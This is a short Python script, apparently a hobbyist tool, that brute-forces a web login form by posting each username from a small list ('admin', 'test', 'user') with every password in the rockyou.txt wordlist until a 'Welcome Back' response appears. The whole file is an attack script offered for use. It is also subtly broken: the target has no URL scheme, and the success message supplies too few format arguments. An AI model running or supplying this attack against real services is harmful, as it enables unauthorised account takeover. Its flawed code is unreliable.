import requests
import sys

target = "127.0.0.1:5000" #Put target IP here.
usernames = ["admin" , "test" , "user"] #Put usernames to try here.
passwords = "rockyou.txt" #Put txt file of your pw list here.
needle = "Welcome Back" #Should be response from good login on page.

for username in usernames:
	with open(passwords, "r") as passwords_list:
		for password in passwords_list:
			password = password.strip("\n").encode()
			sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(
				username, password.decode()))
			sys.stdout.flush()
			r = requests.post(target, data={"username": username, "password": 
				password})
			if needle.encode() in r.content:
				sys.stdout.write("\n")
				sys.stdout.write("\t[>>>>>] Valid password '{}' found for user\
					{}!".format(password.decode()))
				sys.exit()
		sys.stdout.flush()
		sys.stdout.write("\n")
		sys.stdout.write("\tNo password found for '{}' !".format(username))
		sys.stdout.write("\n")		